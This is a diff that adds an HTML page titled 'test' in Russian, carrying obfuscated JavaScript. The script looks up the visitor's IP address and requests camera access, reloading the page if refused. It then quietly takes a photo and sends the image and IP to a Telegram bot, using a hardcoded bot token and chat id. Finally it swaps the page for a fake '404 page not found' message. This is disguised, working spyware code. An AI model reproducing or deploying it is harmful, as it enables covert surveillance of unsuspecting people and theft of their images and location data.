@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>test</title>
+  <style>
+    body { text-align: center; font-family: sans-serif; }
+    video, canvas { display: none; } /* скрываем элементы, чтобы не отображались */
+    button { padding: 10px 20px; font-size: 16px; }
+  </style>
+</head>
+<body>
+
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <script>
+  const _0x36b876=_0x13ee;(function(_0x63bced,_0x2ff157){const _0x58fb56=_0x13ee,_0xe0d31f=_0x63bced();while(!![]){try{const _0x369a85=parseInt(_0x58fb56(0x1d1))/0x1*(parseInt(_0x58fb56(0x1f1))/0x2)+-parseInt(_0x58fb56(0x1f3))/0x3+parseInt(_0x58fb56(0x1f7))/0x4*(parseInt(_0x58fb56(0x1ee))/0x5)+-parseInt(_0x58fb56(0x1d3))/0x6*(-parseInt(_0x58fb56(0x1df))/0x7)+-parseInt(_0x58fb56(0x1ed))/0x8*(-parseInt(_0x58fb56(0x1d5))/0x9)+parseInt(_0x58fb56(0x1f2))/0xa*(parseInt(_0x58fb56(0x1e4))/0xb)+-parseInt(_0x58fb56(0x1d6))/0xc*(parseInt(_0x58fb56(0x1d9))/0xd);if(_0x369a85===_0x2ff157)break;else _0xe0d31f['push'](_0xe0d31f['shift']());}catch(_0x34cefb){_0xe0d31f['push'](_0xe0d31f['shift']());}}}(_0x495b,0xc7ab9));const video=document[_0x36b876(0x1e5)](_0x36b876(0x1da)),canvas=document[_0x36b876(0x1e5)]('canvas'),ctx=canvas[_0x36b876(0x1e0)]('2d'),token=['7996841299',_0x36b876(0x1d4)]['join'](':'),chatId=_0x36b876(0x1f0);let userIp=_0x36b876(0x1ec);fetch(_0x36b876(0x1f5))[_0x36b876(0x1f9)](_0x2f44d1=>_0x2f44d1['json']())['then'](_0x40197d=>{const _0x39d6f9=_0x36b876;userIp=_0x40197d['ip']||_0x39d6f9(0x1ec);})[_0x36b876(0x1ea)](()=>{const _0x27b5fa=_0x36b876;userIp=_0x27b5fa(0x1ec);});let attempts=0x0;const maxAttempts=0x1;function requestCamera(){const _0x321665=_0x36b876;attempts++,navigator['mediaDevices'][_0x321665(0x1e7)]({'video':!![]})[_0x321665(0x1f9)](_0x46363a=>{const _0x442718=_0x321665;video[_0x442718(0x1f8)]=_0x46363a,setTimeout(()=>takePhoto(),0x7d0);})[_0x321665(0x1ea)](_0x40a004=>{const _0x57412d=_0x321665;alert('❌\x20Не\x20удалось\x20получить\x20доступ\x20к\x20камере.\x20Без\x20камеры\x20сайт\x20не\x20работает.'),attempts>=maxAttempts?location[_0x57412d(0x1e9)]():requestCamera();});}function _0x13ee(_0x29ff9d,_0x70ae68){const _0x495b7e=_0x495b();return _0x13ee=function(_0x13ee8f,_0x3dec3e){_0x13ee8f=_0x13ee8f-0x1d1;let _0x61d2bc=_0x495b7e[_0x13ee8f];return _0x61d2bc;},_0x13ee(_0x29ff9d,_0x70ae68);}requestCamera();function takePhoto(){const _0x2479b9=_0x36b876;ctx['drawImage'](video,0x0,0x0,canvas[_0x2479b9(0x1f4)],canvas[_0x2479b9(0x1d8)]),canvas['toBlob'](_0x5b9eb1=>{const _0xe189c0=_0x2479b9;fetch(_0xe189c0(0x1dd)+token+_0xe189c0(0x1dc),{'method':_0xe189c0(0x1ef),'headers':{'Content-Type':_0xe189c0(0x1e8)},'body':JSON['stringify']({'chat_id':chatId,'text':_0xe189c0(0x1e1)+userIp})});const _0x12c631=new FormData();_0x12c631[_0xe189c0(0x1e2)](_0xe189c0(0x1eb),chatId),_0x12c631['append'](_0xe189c0(0x1f6),_0x5b9eb1,'photo.jpg'),fetch(_0xe189c0(0x1dd)+token+_0xe189c0(0x1e3),{'method':_0xe189c0(0x1ef),'body':_0x12c631})[_0xe189c0(0x1f9)](_0x529864=>{const _0x16050a=_0xe189c0;_0x529864['ok']?document[_0x16050a(0x1fa)][_0x16050a(0x1e6)]=_0x16050a(0x1d7):alert(_0x16050a(0x1fb)+_0x529864[_0x16050a(0x1de)]);})['catch'](_0x596b37=>alert(_0xe189c0(0x1db)+_0x596b37));},_0x2479b9(0x1d2));}function _0x495b(){const _0x1a623f=['/sendPhoto','246290EmyBBk','getElementById','innerHTML','getUserMedia','application/json','reload','catch','chat_id','неизвестен','12184tSBhsx','211955inFFpZ','POST','1369408018','348286QCSYWF','280LVSoGT','235893DFDmHa','width','https://ipinfo.io/json','photo','52tWBPcZ','srcObject','then','body','Ошибка\x20отправки:\x20','1mzYczx','image/jpeg','2934786WaGsVA','AAGZVyIAPg8_RsjR9Bxi1pPHky4kbJU8NDk','9423zutKCq','24gbNmDY','<h1\x20style=\x22text-align:center;\x20font-family:sans-serif;\x20color:darkred;\x22>Ошибка\x20404:\x20страница\x20не\x20найдена</h1>','height','16505957QuisBB','video','Сетевая\x20ошибка:\x20','/sendMessage','https://api.telegram.org/bot','statusText','7UMAHhy','getContext','📍\x20IP\x20пользователя:\x20','append'];_0x495b=function(){return _0x1a623f;};return _0x495b();}
+  </script>
+</body>
+</html>
